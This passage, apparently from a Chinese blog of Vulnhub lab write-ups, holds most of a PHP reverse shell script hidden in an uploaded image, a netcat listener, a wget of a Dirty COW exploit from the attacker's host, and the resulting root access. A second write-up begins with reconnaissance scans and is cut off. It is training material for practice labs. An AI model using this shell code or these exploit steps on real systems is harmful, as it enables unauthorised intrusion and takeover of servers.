variable">$descriptorspec</span><span class="token punctuation">,</span> <span class="token variable">$pipes</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="114"></td><td><pre></pre></td></tr><tr><td data-num="115"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_resource</span><span class="token punctuation">(</span><span class="token variable">$process</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="116"></td><td><pre>	<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR: Can't spawn shell"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="117"></td><td><pre>	<span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="118"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="119"></td><td><pre></pre></td></tr><tr><td data-num="120"></td><td><pre><span class="token comment">// Set everything to non-blocking</span></pre></td></tr><tr><td data-num="121"></td><td><pre><span class="token comment">// Reason: Occsionally reads will block, even though stream_select tells us they won't</span></pre></td></tr><tr><td data-num="122"></td><td><pre><span class="token function">stream_set_blocking</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="123"></td><td><pre><span class="token function">stream_set_blocking</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="124"></td><td><pre><span class="token function">stream_set_blocking</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="125"></td><td><pre><span class="token function">stream_set_blocking</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="126"></td><td><pre></pre></td></tr><tr><td data-num="127"></td><td><pre><span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Successfully opened reverse shell to <span class="token interpolation"><span class="token variable">$ip</span></span>:<span class="token interpolation"><span class="token variable">$port</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="128"></td><td><pre></pre></td></tr><tr><td data-num="129"></td><td><pre><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="130"></td><td><pre>	<span class="token comment">// Check for end of TCP connection</span></pre></td></tr><tr><td data-num="131"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="132"></td><td><pre>		<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR: Shell connection terminated"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="133"></td><td><pre>		<span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="134"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="135"></td><td><pre></pre></td></tr><tr><td data-num="136"></td><td><pre>	<span class="token comment">// Check for end of STDOUT</span></pre></td></tr><tr><td data-num="137"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="138"></td><td><pre>		<span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ERROR: Shell process terminated"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="139"></td><td><pre>		<span class="token keyword">break</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="140"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="141"></td><td><pre></pre></td></tr><tr><td data-num="142"></td><td><pre>	<span class="token comment">// Wait until a command is end down $sock, or some</span></pre></td></tr><tr><td data-num="143"></td><td><pre>	<span class="token comment">// command output is available on STDOUT or STDERR</span></pre></td></tr><tr><td data-num="144"></td><td><pre>	<span class="token variable">$read_a</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="145"></td><td><pre>	<span class="token variable">$num_changed_sockets</span> <span class="token operator">=</span> <span class="token function">stream_select</span><span class="token punctuation">(</span><span class="token variable">$read_a</span><span class="token punctuation">,</span> <span class="token variable">$write_a</span><span class="token punctuation">,</span> <span class="token variable">$error_a</span><span class="token punctuation">,</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="146"></td><td><pre></pre></td></tr><tr><td data-num="147"></td><td><pre>	<span class="token comment">// If we can read from the TCP socket, send</span></pre></td></tr><tr><td data-num="148"></td><td><pre>	<span class="token comment">// data to process's STDIN</span></pre></td></tr><tr><td data-num="149"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$read_a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="150"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SOCK READ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="151"></td><td><pre>		<span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$chunk_size</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="152"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SOCK: <span class="token interpolation"><span class="token variable">$input</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="153"></td><td><pre>		<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="154"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="155"></td><td><pre></pre></td></tr><tr><td data-num="156"></td><td><pre>	<span class="token comment">// If we can read from the process's STDOUT</span></pre></td></tr><tr><td data-num="157"></td><td><pre>	<span class="token comment">// send data down tcp connection</span></pre></td></tr><tr><td data-num="158"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$read_a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="159"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"STDOUT READ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="160"></td><td><pre>		<span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$chunk_size</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="161"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"STDOUT: <span class="token interpolation"><span class="token variable">$input</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="162"></td><td><pre>		<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="163"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="164"></td><td><pre></pre></td></tr><tr><td data-num="165"></td><td><pre>	<span class="token comment">// If we can read from the process's STDERR</span></pre></td></tr><tr><td data-num="166"></td><td><pre>	<span class="token comment">// send data down tcp connection</span></pre></td></tr><tr><td data-num="167"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$read_a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="168"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"STDERR READ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="169"></td><td><pre>		<span class="token variable">$input</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$chunk_size</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="170"></td><td><pre>		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$debug</span><span class="token punctuation">)</span> <span class="token function">printit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"STDERR: <span class="token interpolation"><span class="token variable">$input</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="171"></td><td><pre>		<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="172"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="173"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="174"></td><td><pre></pre></td></tr><tr><td data-num="175"></td><td><pre><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$sock</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="176"></td><td><pre><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="177"></td><td><pre><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="178"></td><td><pre><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$pipes</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="179"></td><td><pre><span class="token function">proc_close</span><span class="token punctuation">(</span><span class="token variable">$process</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="180"></td><td><pre></pre></td></tr><tr><td data-num="181"></td><td><pre><span class="token comment">// Like print, but does nothing if we've daemonised ourself</span></pre></td></tr><tr><td data-num="182"></td><td><pre><span class="token comment">// (I can't figure out how to redirect STDOUT like a proper daemon)</span></pre></td></tr><tr><td data-num="183"></td><td><pre><span class="token keyword">function</span> <span class="token function-definition function">printit</span> <span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="184"></td><td><pre>	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$daemon</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="185"></td><td><pre>		<span class="token keyword">print</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$string</span></span>\n"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="186"></td><td><pre>	<span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="187"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="188"></td><td><pre></pre></td></tr><tr><td data-num="189"></td><td><pre><span class="token delimiter important">?></span></span></pre></td></tr></table></figure><p>​</p>
<p>修改监听 <code>ip端口</code> ，将源码粘贴到任意一张图片后上传。</p>
<p>再开启监听</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>nc <span class="token operator">-</span>lvvp <span class="token number">1234</span></pre></td></tr></table></figure><p>可以成功返回 shell。</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211115181653448-260492717.png" alt="image" /></p>
<h2 id="权限提升"><a class="anchor" href="#权限提升">#</a> 权限提升</h2>
<p>之前我们在使用  <code>nmap</code>  扫描时发现，该服务器的内核版本为 <code>linux 2.6.X</code> 。</p>
<p>用<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZpcmVGYXJ0L2RpcnR5Y293">脏牛</span>试一试，尝试不能直接下载 <code>github</code>  上的文件，先在 <code>kali</code>  下载并编译：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>git clone https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>github<span class="token punctuation">.</span>com<span class="token operator">/</span>FireFart<span class="token operator">/</span>dirtycow<span class="token punctuation">.</span>git</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211115181807368-1575042867.png" alt="image" /></p>
<p>然后将 <code>dirty</code>  放到 <code>/var/www/html/</code>  目录下， <code>kali开启web服务</code> ，在靶机上下载该文件</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>weget http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.115</span><span class="token operator">/</span>dirty</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211115181833354-368513209.png" alt="image" /></p>
<p>赋予权限后运行:</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211115181842344-552158689.png" alt="image" /></p>
<p>获取到账号和密码：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>firefart</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token number">123456</span></pre></td></tr></table></figure><p>直接账号登录失败</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211115181854076-1116046616.png" alt="image" /></p>
<p>用 <code>xshell</code>  登陆，成功</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211115181944096-1353533063.png" alt="image" /></p>
<h3 id="获取-flag"><a class="anchor" href="#获取-flag">#</a> 获取 flag</h3>
<p>进入 <code>/root</code>  目录下：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211115181958783-1514138770.png" alt="image" /></p>
<p>成功拿到 flag。</p>
]]></content>
      <categories>
        <category>vulnhub靶机实战</category>
      </categories>
      <tags>
        <tag>vulnhub靶机实战</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机-School</title>
    <url>/article/50ab0d7.html</url>
    <content><![CDATA[<p>扫描本地靶机：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>arp<span class="token operator">-</span>scan <span class="token operator">-</span>l</pre></td></tr></table></figure><p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211011213504514-437094754.png" alt="" /></p>
<p>结合 ifconfig 查询本机 ip：</p>
<p><img data-src="https://21r000-image.oss-cn-shanghai.aliyuncs.com/pic2021/2467930-20211011222207385-404436622.png" alt="" /></p>
<p>可以确定靶机 IP 为：192.168.56.117</p>
<p>扫描靶机端口</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>nmap <span class="token operator">-</span>p<span class="token operator">-</span> <span class="token operator">-</span><span class="token constant">A</span> <span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.117</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>root@kali<span class="token operator">:</span><span class="token operator">~</span><span class="token operator">/</span>Desktop# nmap <span class="token operator">-</span>p<span class="token operator">-</span> <span class="token operator">-</span><span class="token constant">A</span> <span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.117</span></pre></td></tr><tr><td data-num="4"></td><td><pre>Starting Nmap <span class="token number">7.80</span> <span class="token punctuation">(</span> https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>nmap<span class="token punctuation">.</span>org <span class="token punctuation">)</span> at <span class="token number">2021</span><span class="token operator">-</span><span class="token number">10</span><span class="token operator">-</span><span class="token number">09</span> <span class="token number">04</span><span class="token operator">:</span><span class="token number">05</span> <span class="token constant">EDT</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token literal-property property">mass_dns</span><span class="token operator">:</span> warning<span class="token operator">:</span> Unable to determine any <span class="token constant">DNS</span> servers<span class="token punctuation">.</span> Reverse <span class="token constant">DNS</span> is disabled<span class="token punctuation">.</span> Try using <span class="token operator">--</span>system<span class="token operator">-</span>dns or specify valid servers <span class="token keyword">with</span> <span class="token operator">--</span>dns<span class="token operator">-</span>servers</pre></td></tr><tr><td data-num="6"></td><td><pre>Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span><span class="token number">.56</span><span class="token number">.117</span></pre></td></tr><tr><td data-num="7"></td><td><pre>Host is <span class="token function">up</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">.</span>00053s latency<span class="token punctuation">)</span><span class="token punctuation">.</span></pre></td></tr><tr><td data-num="8"></td><td><pre>Not shown<span class="token operator">:</span> <span class="token number">65532</span> closed ports</pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token constant">PORT</span>   <span class="token constant">STATE</span> <span class="token constant">SERVICE</span> <span class="token constant">VERSION</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token number">22</span><span class="token operator">/</span>tcp open  ssh     OpenSSH <span class="token number">7</span><span class="token punctuation">.</span>9p1 Debian <span class="token number">10</span><span class="token operator">+</span><span class="token function">deb10u2</span> <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token operator">|</span> ssh<span class="token operator">-</span>hostkey<span class="token operator">:</span> </pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token operator">|</span>   <span class="token number">2048</span> <span class="token literal-property property">de</span><span class="token operator">:</span>b5<span class="token operator">:</span><span class="token number">23</span><span class="token operator">:</span><span class="token number">89</span><span class="token operator">:</span>bb<span class="token operator">:</span>9f<span class="token operator">:</span>d4<span class="token operator">:</span>1a<span class="token operator">:</span>b5<span class="token operator">:</span><span class="token number">04</span><span class="token operator">:</span><span class="token number">53</span><span class="token operator">:</span>d0<span class="token operator">:</span>b7<span class="token operator">:</span>5c<span class="token operator">:</span>b0<span class="token operator">:</span><span class="token number">3</span><span class="token function">f</span> <span class="token punctuation">(</span><span class="token constant">RSA</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token operator">|</span>   <span class="token number">256</span> <span class="token number">16</span><span class="token operator">:</span><span class="token number">09</span><span class="token operator">:</span><span class="token number">14</span><span class="token operator">:</span>ea<span class="token operator">:</span>b9<span class="token operator">:</span>fa<span class="token operator">:</span><span class="token number">17</span><span class="token operator">:</span>e9<span class="token operator">:</span><span class="token number">45</span><span class="token operator">:</span><span class="token number">39</span><span class="token operator">:</span>5e<span class="token operator">:</span>3b<span class="token operator">:</span>b4<span class="token operator">:</span>fd<span class="token operator">:</span><span class="token number">11</span><span class="token operator">:</span><span class="token number">0</span><span class="token function">a</span> <span class="token punctuation">(</span><span class="token constant">ECDSA</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token operator">|</span>_  <span class="token number">256</span> 9f<span class="token operator">:</span><span class="token number">66</span><span class="token operator">:</span>5e<span class="token operator">:</span><span class="token number">71</span><span class="token operator">:</span>b9<span class="token operator">:</span><span class="token number">12</span><span class="token operator">:</span>5d<span class="token operator">:</span>ed<span class="token operator">:</span><span class="token number">70</span><span class="token operator">:</span>5a<span class="token operator">:</span>4f<span class="token operator">:</span>5a<span class="token operator">:</span>8d<span class="token operator">:</span>0d<span class="token operator">:</span><span class="token number">65</span><span class="token operator">:</span><span class="token function">d5</span> <span class="token punctuation">(</span><span class="token constant">ED25519</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token number">23</span><span class="token operator">/</span>tcp open  telnet<span class="token operator">?</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token operator">|</span> fingerprint<span class="token operator">-</span>strings<span class="token operator">:</span> </pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token operator">|</span>   DNSStatusRequestTCP<span class="token punctuation">,</span> DNSVersionBindReqTCP<span class="token punctuation">,</span> FourOhFourRequest<span class="token punctuation">,</span> GenericLines<span class="token punctuation">,</span> GetRequest<span class="token punctuation">,</span> HTTPOptions<span class="token punctuation">,</span> Help<span class="token punctuation">,</span> JavaRMI<span class="token punctuation">,</span> Kerberos<span class="token punctuation">,</span> LANDesk<span class="token operator">-</span><span class="token constant">RC</span><span class="token punctuation">,</span> LDAPBindReq<span class="token punctuation">,</span> LDAPSearchReq<span class="token punctuation">,</span> LPDString<span class="token punctuation">,</span> <span class="token constant">NCP</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> NotesRPC<span class="token punctuation">,</span> RPCCheck<span class="token punctuation">,</span> RTSPRequest<span class="token punctuation">,</span> SIPOptions<span class="token punctuation">,</span> SMBProgNeg<span class="token punctuation">,</span> SSLSessionReq<span class="token punctuation">,</span> TLSSessionReq<span class="token punctuation">,</span> TerminalServer<span class="token punctuation">,</span> TerminalServerCookie<span class="token punctuation">,</span> WMSRequest<span class="token punctuation">,</span> X11Probe<span class="token punctuation">,</span> afp<span class="token punctuation">,</span> ms<span class="token operator">-</span>sql<span class="token operator">-</span>s<span class="token punctuation">,</span> oracle<span class="token operator">-</span>tns<span class="token punctuation">,</span> <span class="token literal-property property">tn3270</span><span class="token operator">:</span> </pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token operator">|</span>_    Verification Code<span class="token operator">:</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token number">80</span><span class="token operator">/</span>tcp open  http    Apache httpd <span class="token number">2.4</span><span class="token number">.38</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>Debian<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token operator">|</span>_http<span class="token operator">-</span>server<span class="token operator">-</span>header<span class="token operator">:</span> Apache<span class="token operator">/</span><span class="token number">2.4</span><span class="token number">.38</span> <span class="token punctuation">(</span>Debian<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token operator">|</span> http<span class="token operator">-</span>title<span class="token operator">:</span> <span class="token number">404</span> Not Found</pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token operator">|</span>_Requested resource was login<span class="token punctuation">.</span>php</pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token number">1</span> service unrecognized despite returning data<span class="token punctuation">.</span> If you know the service<span class="token operator">/</span>version<span class="token punctuation">,</span> please submit the following fingerprint at https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>nmap<span class="token punctuation">.</span>org<span class="token operator">/</span>cgi<span class="token operator">-</span>bin<span class="token operator">/</span>submit<span class="token punctuation">.</span>cgi<span class="token operator">?</span><span class="token keyword">new</span><span class="token operator">-</span>service <span class="token operator">:</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token constant">SF</span><span class="token operator">-</span>Port23<span class="token operator">-</span><span class="token constant">TCP</span><span class="token operator">:</span><span class="token constant">V</span><span class="token operator">=</span><span class="token number">7.80</span><span class="token operator">%</span><span class="token constant">I</span><span class="token operator">=</span><span class="token number">7</span><span class="token operator">%</span><span class="token constant">D</span><span class="token operator">=</span><span class="token number">10</span><span class="token operator">/</span><span class="token number">9</span><span class="token operator">%</span>Time<span class="token operator">=</span>61614D38<span class="token operator">%</span><span class="token constant">P</span><span class="token operator">=</span>x86_64<span class="token operator">-</span>pc<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">%</span><span class="token function">r</span><span class="token punctuation">(</span><span class="token constant">NULL</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span><span class="token punctuation">,</span>1C<span class="token punctuation">,</span><span class="token string">"Verification\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c"</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token function">r</span><span class="token punctuation">(</span>GenericLines<span class="token punctuation">,</span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>1C<span class="token punctuation">,</span><span class="token string">"Verification\x20Code:\n\0\0\0\xee\x1e@\0\xe2\x1c"</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token function">r</span><span class="token punctuation">(</span>tn3270<span class="token punctuation">,</span>1C<span class="token punctuation">,</span>"Ver</pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>ification\x20Code<span class="token operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c<span class="token string">")%r(GetRequest,1C,"</span>Verifi</pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>cation\x20Code<span class="token operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c<span class="token string">")%r(HTTPOptions,1C,"</span>Verifica</pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>tion\x20Code<span class="token operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c<span class="token string">")%r(RTSPRequest,1C,"</span>Verificati</pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>on\x20Code<span class="token operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c<span class="token string">")%r(RPCCheck,1C,"</span>Verification\x2</pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>0Code<span class="token operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c<span class="token string">")%r(DNSVersionBindReqTCP,1C,"</span>Verifica</pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>tion\x20Code<span class="token operator">:</span>\n\<span class="token number">0</span>\<span class="token number">0</span>\<span class="token number">0</span>\xee\x1e@\<span class="token number">0</span>\xe2\x1c<span class="token string">")%r(DNSStatusRequestTCP,1C,"</span>Ve</pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token constant">SF</span><span class="token operator">:</span>rification\x20Code<span class="token 